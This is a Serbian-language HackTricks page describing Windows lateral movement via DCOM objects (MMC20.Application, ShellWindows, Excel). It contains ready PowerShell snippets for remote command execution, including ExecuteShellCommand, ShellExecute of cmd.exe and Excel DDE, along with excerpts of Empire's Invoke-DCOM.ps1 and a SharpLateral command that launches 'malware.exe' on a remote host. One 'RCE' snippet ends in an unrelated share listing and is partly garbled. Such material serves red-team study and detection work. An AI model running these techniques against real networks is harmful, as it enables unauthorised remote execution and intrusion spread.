# DCOM Exec

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS ili preuzimanje HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repozitorijum**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijum**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

**Try Hard Security Group**

<figure><img src="../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## MMC20.Application

**Za više informacija o ovoj tehnici pogledajte originalni post na** [**https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/**](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)

Model distribuiranih komponentnih objekata (DCOM) predstavlja zanimljivu mogućnost za mrežne interakcije sa objektima. Microsoft pruža sveobuhvatnu dokumentaciju za DCOM i Model komponentnih objekata (COM), dostupnu [ovde za DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) i [ovde za COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Spisak DCOM aplikacija može se dobiti korišćenjem PowerShell komande:

```bash
Get-CimInstance Win32_DCOMApplication
```

COM objekat, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), omogućava pisanje skriptova za MMC snap-in operacije. Posebno, ovaj objekat sadrži `ExecuteShellCommand` metod pod `Document.ActiveView`. Više informacija o ovom metodu možete pronaći [ovde](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Proverite pokretanjem:

Ova funkcija olakšava izvršavanje komandi preko mreže putem DCOM aplikacije. Za interakciju sa DCOM-om na daljinu kao administrator, PowerShell se može koristiti na sledeći način:

```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

Ova komanda se povezuje sa DCOM aplikacijom i vraća instancu COM objekta. Metoda ExecuteShellCommand može zatim biti pozvana da izvrši proces na udaljenom računaru. Proces uključuje sledeće korake:

Provera metoda:

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Dobijanje daljinskog izvršenja koda (RCE):

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```

## ShellWindows & ShellBrowserWindow

**Za više informacija o ovoj tehnici pogledajte originalni post** [**https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/**](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

Identifikovano je da objekat **MMC20.Application** nedostaje eksplicitna "LaunchPermissions", podrazumevajući dozvole koje dozvoljavaju pristup administratorima. Za dalje detalje, može se istražiti nit [ovde](https://twitter.com/tiraniddo/status/817532039771525120), a preporučuje se korišćenje [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET za filtriranje objekata bez eksplicitnih dozvola za pokretanje.

Dva specifična objekta, `ShellBrowserWindow` i `ShellWindows`, istaknuta su zbog nedostatka eksplicitnih dozvola za pokretanje. Odsustvo unosa `LaunchPermission` u registru pod `HKCR:\AppID\{guid}` označava nedostatak eksplicitnih dozvola.

### ShellWindows

Za `ShellWindows`, koji nema ProgID, .NET metode `Type.GetTypeFromCLSID` i `Activator.CreateInstance` olakšavaju instanciranje objekta koristeći njegov AppID. Ovaj proces koristi OleView .NET za dobijanje CLSID-a za `ShellWindows`. Jednom kada je instanciran, interakcija je moguća kroz metod `WindowsShell.Item`, što dovodi do poziva metoda poput `Document.Application.ShellExecute`.

Dati su primeri PowerShell komandi za instanciranje objekta i izvršavanje komandi na daljinu:

```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### Lateralno kretanje pomoću Excel DCOM objekata

Lateralno kretanje može se postići iskorišćavanjem DCOM Excel objekata. Za detaljne informacije, preporučuje se čitanje diskusije o iskorišćavanju Excel DDE za lateralno kretanje putem DCOM na [Cybereason-ovom blogu](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Projekat Empire pruža PowerShell skriptu, koja demonstrira korišćenje Excela za izvršavanje udaljenog koda (RCE) manipulišući DCOM objektima. U nastavku su isečci iz skripte dostupne na [Empire-ovom GitHub repozitorijumu](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1), prikazujući različite metode zloupotrebe Excela za RCE:

```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```

### Alatke za automatizaciju lateralnog kretanja

Dve alatke su istaknute za automatizaciju ovih tehnika:

* **Invoke-DCOM.ps1**: PowerShell skripta koju pruža Empire projekat koja pojednostavljuje pozivanje različitih metoda za izvršavanje koda na udaljenim mašinama. Ova skripta je dostupna na Empire GitHub repozitorijumu.
* **SharpLateral**: Alatka dizajnirana za izvršavanje koda na daljinu, koja se može koristiti sa komandom:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

## Automatski alati

* Powershell skripta [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) omogućava lako pozivanje svih komentarisanih načina izvršavanja koda na drugim mašinama.
* Takođe možete koristiti [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

## Reference

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

**Try Hard Security Group**

<figure><img src="../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
